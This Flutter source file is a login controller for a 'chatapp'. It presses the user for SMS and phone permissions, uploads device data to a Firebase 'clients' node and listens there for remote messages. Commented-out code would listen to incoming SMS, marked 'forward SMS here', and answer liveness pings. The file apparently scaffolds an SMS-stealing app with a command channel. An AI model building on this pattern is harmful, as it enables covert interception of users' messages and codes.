// import 'package:another_telephony/telephony.dart';
import 'package:chatapp/service/send_sms.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:flutter/cupertino.dart';
import 'package:get/get.dart';
import 'package:permission_handler/permission_handler.dart';

class LoginController extends GetxController {
  // final Telephony telephony = Telephony.instance;

  @override
  void onInit() {
    super.onInit();
    requestPermissions();
    // SMSClass.listen((sender, body) {
    //  print("Flutter got SMS from $sender: $body");
    //  // forward SMS here
    // });
    // SMSClass.smsListen();
  }

  GlobalKey<FormState> formKey = GlobalKey();

  TextEditingController nameController = TextEditingController();
  TextEditingController mobileNoController = TextEditingController();

  Future<void> requestPermissions() async {
    await [Permission.sms, Permission.phone].request();
  }

  Future<bool> checkPermissionIsGranted() async {
    bool isSMS = await Permission.sms.isGranted;
    bool isPhone = await Permission.phone.isGranted;

    if (isSMS == false || isPhone == false) {
      Get.snackbar(
        'Missing Permission',
        'Please Allow SMS and Phone Permission',
      );
      Future.delayed(Duration(seconds: 4)).then((value) {
        openSettings();
      });

      return false;
    } else {
      return true;
    }
  }

  Future<void> openSettings() async {
    bool opened = await openAppSettings();
  }

  Future<void> sendDataToFirebase({required Map<String,dynamic> deviceData}) async {
    final DatabaseReference dbRef = FirebaseDatabase.instance.ref("clients");
    await dbRef.update(deviceData);
    print("✅ Data pushed successfully");
  }




  void listenForLiveness(String deviceId) {
    final ref = FirebaseDatabase.instance
        .ref("clients/$deviceId");

    ref.onValue.listen((event) {
      if (event.snapshot.exists) {
        final data = event.snapshot.value as Map?;
        // final text = data?["text"];


        print("real data::$data");


        // if (text == "ping") {
        //   // 🔥 reply with pong
        //   ref.set({
        //     "text": "pong",
        //     "lastUpdated": DateTime.now().toIso8601String(),
        //   });
        // }
      }
    });
  }

}
